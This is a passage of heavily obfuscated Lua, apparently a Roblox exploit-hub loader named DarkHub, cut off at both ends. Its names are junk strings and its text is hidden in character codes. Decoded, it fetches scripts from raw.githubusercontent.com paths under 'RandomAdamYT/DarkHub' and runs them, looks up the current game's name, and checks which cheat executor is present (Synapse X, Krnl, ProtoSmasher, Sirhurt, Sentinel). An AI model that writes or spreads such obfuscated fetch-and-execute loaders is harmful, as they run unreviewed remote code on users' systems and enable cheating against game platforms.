uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="245B3B702CEB25FC65FAD9FB962F8FA54FEC700748BE09DB3256825248DA5E8330C0C17EE1494BA825DB3EA0B1CB060FBE47"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+16 end)(),101 ,100 ,71 ,97 ,109 ,101 ,115 )..'']local UWuOWoOwOUwuUwuuwUOwOuWuuwUOwOuwUOWoowOuwuUWuUwuOwouwUoWOuwUUwU=getfenv()[uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(112 ,101 ,98 ,99 ,95 ,101 ,120 ,101 ,99 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={49,911,199,259,104}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+112,116 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={750,937,789,207,807}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+96)..'']local OWOUwuowOUwuoWOUwuuwUOwOuWuuWUowOOwouwUOwOowOOwOuwuowOOwOuwUUWu=uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO(UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU:HttpGet(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(104 ,116 ,116 ,112 ,115 ,58 ,47 ,47 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={792,96,258,146,595}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+109,97 ,119 ,46 ,103 ,105 ,116 ,104 ,117 ,98 ,117 ,115 ,101 ,114 ,99 ,111 ,110 ,116 ,101 ,110 ,116 ,46 ,99 ,111 ,109 ,47 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={806,385,734,895,828}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+77,97 ,110 ,100 ,111 ,109 ,65 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="BCE77843B05FEB99682D1C4F81A937239FF6BEF5A24B88D9DA36DA9B4C5236E82175EF7EE7248F1E31572AB3805E370D6DF1"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),97 ,109 ,89 ,84 ,47 ,68 ,97 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="D9BA15E0E27D59BEDD17BCE60C226A7CAF6D460E5432F4CF5A40E24FCA4DD270FE727C513EB826AF3DA65C272A3350CD35C3"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+14 end)(),107 ,72 ,117 ,98 ,47 ,109 ,97 ,115 ,116 ,101 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="BC22E3A5ED6B13534F3B4D619F2343383E1B602293A6FE26DFA5AE7195FCBB837D890E9B5F6E9BE6F43DAFF2440175EB8948"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+14 end)(),47 ,80 ,97 ,116 ,99 ,104 ,78 ,111 ,116 ,101 ,115 )..'',true ))local OwOUwuOwOUwuowOOWOUwUUwUOwOUwUOwoUWUUWuUWuUwuUwUUwUUwUUwUUwUOWo=uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO(UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU:HttpGet(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(104 ,116 ,116 ,112 ,115 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="68D7BF94B3F58C4CD8E8A356E264C2B8189C6C81501A171975277F2326"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),47 ,47 ,114 ,97 ,119 ,46 ,103 ,105 ,116 ,104 ,117 ,98 ,117 ,115 ,101 ,114 ,99 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="72851E090EF3EE18DD5C77D5E0FAB2451A5A4CAF51B9B6F5389F0A45AD87F92333CC66E217E6C3E893DA23EB1A40685566BA"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+11 end)(),110 ,116 ,101 ,110 ,116 ,46 ,99 ,111 ,109 ,47 ,82 ,97 ,110 ,100 ,111 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="165AA715A0637133B053E29296AC3B9F71715B43FE6B83E480B0EE58A36D671EEC75C7D1E85F32C450D19B4AAAA9D63B0524"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+9 end)(),65 ,100 ,97 ,109 ,89 ,84 ,47 ,68 ,97 ,114 ,107 ,72 ,117 ,98 ,47 ,109 ,97 ,115 ,116 ,101 ,114 ,47 ,67 ,114 ,101 ,100 ,105 ,116 ,115 )..'',true ))local UwUUwuOwOOwOuWUuWUowOOwOuwUUwUOWOuwUOwOoWOuwUowOuWuUWuowOUwuowO=UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU:GetService(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char((function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="77C8F0E5698E022ACAF3DDAE9345B5E59086245058EC4B2BE104FA7310DAD78263E6E5BCBB944"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),97 ,114 ,107 ,101 ,116 ,112 ,108 ,97 ,99 ,101 ,83 ,101 ,114 ,118 ,105 ,99 ,101 )..''):GetProductInfo(UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU.PlaceId).Name local OwoUwuOwOowoOwOOwOuwUuwUUwUOwOuWUuWUUwuUWuOwoUwuOwOUwuUWUOWOuWU=UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU:GetService(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,119 ,101 ,101 ,110 ,83 ,101 ,114 ,118 ,105 ,99 ,101 ).."")local OwouwUuwuUwuUwUOwoowoUwUOwouWuuWUUwuOWouwuOwouWUOwOOwOowOOwOOWO if OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO then OwouwUuwuUwuUwUOwoowoUwUOwouWuuWUUwuOWouwuOwouWUOwOOwOowOOwOOWO,OWoUwuoWOOwOUwUUwUOwOOwOUwuOwOUwUOwOuwUUwUUwUUwUUwUowOUwuOwOOWO=OwOOwoUwUOWoUWUUWUowOuwUuWUOwOUwuoWoOwOuwUoWOOwOUwUUwUowOuwUOwO()if OWoUwuoWOOwOUwUUwUOwOOwOUwuOwOUwUOwOuwUUwUUwUUwUUwUowOUwuOwOOWO then OwouwUuwuUwuUwUOwoowoUwUOwouWuuWUUwuOWouwuOwouWUOwOOwOowOOwOOWO=OwouwUuwuUwuUwUOwoowoUwUOwouWuuWUUwuOWouwuOwouWUOwOOwOowOOwOOWO..uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(32 )..''..uwUowOOwOuwUoWOuWuuwuUwUUwuuwUUwUUwuUwUuwUuwUuWUUwuuwUOwOOwoowO(OWoUwuoWOOwOUwUUwUOwOOwOUwuOwOUwUOwOuwUUwUUwUUwUUwUowOUwuOwOOWO)end else OwouwUuwuUwuUwUOwoowoUwUOwouWuuWUUwuOWouwuOwouWUOwOOwOowOOwOOWO=OwOoWoOWoOwOOwOUwUUWuuwUUwUuWuOwOOwOUwUowOUwUOwoOwoOwoOWoOwOOwO and uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(83  ,101  ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(65 ,55 ,49 ,56 ,67 ,54 ,50 ,57 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="7D8375616CF4B62DD311FDEC25653C689206563A9EABF049441974F3866869186625F0"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),51 ,52 ,53 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={158,656,665,804,20}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+46,53 ,65 ,50 ,70 ,49 ,67 ,68 ,55 ,57 ,66 ,50 ,70 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="9DEB6BC690F87675AA301A7E79FA6AE008A00EFAC53C836969DA99F8A"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),69 ,56 ,49 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={840,238,82,637,838}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+60,68 ,57 ,54 ,70 ,55 ,48 ,69 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="56690CF3B5EAFFDA63F7C592848BB4838899FBF1DDAF7DFAF9E75A2E2B4492400219F"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="106EB2EEFDDC40EDEB0D1356A2EE5A83FC7C4607BA8E425CC685C2353"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),70 ,53 ,50 ,66 ,68 ,56 ,55 ,52 ,54 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="F85E01591B5C5BD4CA64A4C51FCE9BDD29F97E9B2C58D546415798F0"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),66 ,65 ,68 ,49 ,52 ,67 ,52 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={128,444,627,658,88}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+51,67 ,55 ,48 ,50 ,50 ,69 ,70 ,67 ,51 ,57 ,48 ,65 ,67 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={256,475,318,320,404}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+65,55 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="5C0307BA9609E1C34BA6C79B7C00F8B0ACD6AFD2366E330857B01"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),68 ,54 ,50 ,54 ,70 ,50 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={402,996,331,904,825}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+50,54 ,49 ,56 ,49 ,54 ,52 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={755,684,908,266,185}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+45,50 ,56 ,49 ,70 ,69 ,65 ,48 ,66 ,54 ,68 ,52 ,53 ,54 )..""return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+10  end)(),116  ,105  ,110  ,101  ,108  )..uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char()..""or UWuOWoOwOUwuUwuuwUOwOuWuuwUOwOuwUOWoowOuwuUWuUwuOwouwUoWOuwUUwU and uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(80  ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={36,670,453,298,91}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+109,111  ,116  ,111  ,83  ,109  ,97  ,115  ,104  ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(68 ,65 ,56 ,68 ,51 ,69 ,70 ,57 ,50 ,50 ,48 ,49 ,49 ,52 ,49 ,69 ,53 ,55 ,49 ,51 ,66 ,67 ,57 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={399,247,271,607,260}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+62,68 ,67 ,55 ,54 ,70 ,55 ,48 ,52 ,69 ,66 ,51 ,66 ,48 ,57 ,67 ,56 ,52 ,49 ,69 ,55 ,65 ,53 ,56 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="8D02178618DA9DED9CC64197EB327339B728A29A97EBB3417CCD50"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),68 ,51 ,51 ,69 ,55 ,48 ,53 ,48 ,53 ,66 ,55 ,67 ,65 ,49 ,54 ,52 ,50 ,52 ,57 ,55 ,69 ,66 ,53 ,68 ,67 ,56 ,54 ,56 ,56 ,57 ,55 ,50 ,57 ,53 ,49 ,66 ,67 ,67 ,54 ,65 ,66 ,57 ,65 ,55 ,50 ,50 ,69 ,70 ,67 ,56 ,67 ,48 )..""return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+1  end)(),114  )..uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char()..""or OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo and uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(83  ,105  ,114  ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="86142C422CB7160F84388992A72C8AAC615F777406345A353D273EC602A38476830D6B7398D51C6EDA9FDC461BE50102F4BD"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+4 end)(),(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="A2A3A7AFB1DCFD3D4E14DC0B4A8CC5E6391C797C322AFF57299AFD1817EF4BFC2ED40C60A45E36F3D8E48D1F6FEA75712DFE"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+17 end)(),114  ,116  )..uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char()..""or(UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu and not OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo)and uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char((function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={480 ,834 ,34 ,67 ,410 }return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+78 ,121  ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(70 ,68 ,67 ,50 ,53 ,65 ,54 ,69 ,48 ,50 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="9D1F742B75B401AF64F6470E7C1E1D328C0ADF1071811C638B2"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),57 ,49 ,66 ,67 ,49 ,67 ,54 ,69 ,48 ,51 ,53 ,52 ,52 ,66 ,52 ,50 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="F228C5DA6068405F40C3F042D27D0B8BFA5158C059503CFA72F4"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),68 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={640,808,467,856,228}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+63,50 ,68 ,51 ,65 ,51 ,49 ,51 ,54 ,67 ,70 ,67 ,67 ,55 ,66 ,65 ,56 ,57 ,49 ,56 ,68 ,66 ,54 ,57 ,70 ,70 ,54 ,49 ,53 ,69 ,53 ,48 ,50 ,56 ,51 ,55 ,56 ,69 ,68 ,53 ,69 ,57 ,55 ,68 ,68 ,65 ,50 ,67 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="E7BA7C44EB1BA546BF9979DE08688F52601281E3DD1490AFC78C950A0CA38F8FC"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),68 ,52 ,51 ,50 ,52 ,68 ,48 ,68 ,70 ,51 ,69 ,56 ,48 ,48 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="F71D61D682E32386F5543E8A6834190E375B4355871A93AB280EA"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),65 ,68 ,68 ,49 ,48 ,55 ,56 )..""return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+10  end)(),97  ,112  ,115  ,101  ,32  ,88  )..uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char()..""or uWUuWuUwuowOUwUowOUWUUwUUwUOwOOwOOwOUwUuwUUwuUWuowOowoUwUOwOUwU and uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(75  ,114  ,110  ,108  )..uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char()..""end owOUwUuWuuwUUwUOwoUwuUwUOwoOWOOwoUwuUwUOwouWuUwUUwuOwOOwoUWuOwO=UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU:GetService(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(72 ,116 ,116 ,112 ,83 ,101 ,114 ,118 ,105 ,99 ,101 )..""):JSONDecode(UwUOwoOwOOWOOwOUWUOwouWuOwOuWuuWuowOOwOoWOowoUwUuwuOwOOwOUwuuwU:HttpGet(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char((function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={312,746,919,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu,OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo)return 341 and uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO or uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO==nil or UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu*uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu,OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo end)()or((35847)+(94717))or 82721*(not(28491)and(60596)),869}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+99,116 ,116 ,112 ,115 ,58 ,47 ,47 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="46C4B5C9373BFDDE6912790E028E9052446BFF18BFC64430BE99F26907528F3B761D92FD701937D738006C9112C58CBC6774"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+14 end)(),97 ,119 ,46 ,103 ,105 ,116 ,104 ,117 ,98 ,117 ,115 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="456666DC86D29057F3E274C37516F8B37CD59923560FB727DA3E9C8A291F4E4FF8F4F7B78C00F364E6DAE886F63D738CDCC7"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+1 end)(),114 ,99 ,111 ,110 ,116 ,101 ,110 ,116 ,46 ,99 ,111 ,109 ,47 ,82 ,97 ,110 ,100 ,111 ,109 ,65 ,100 ,97 ,109 ,89 ,84 ,47 ,68 ,97 ,114 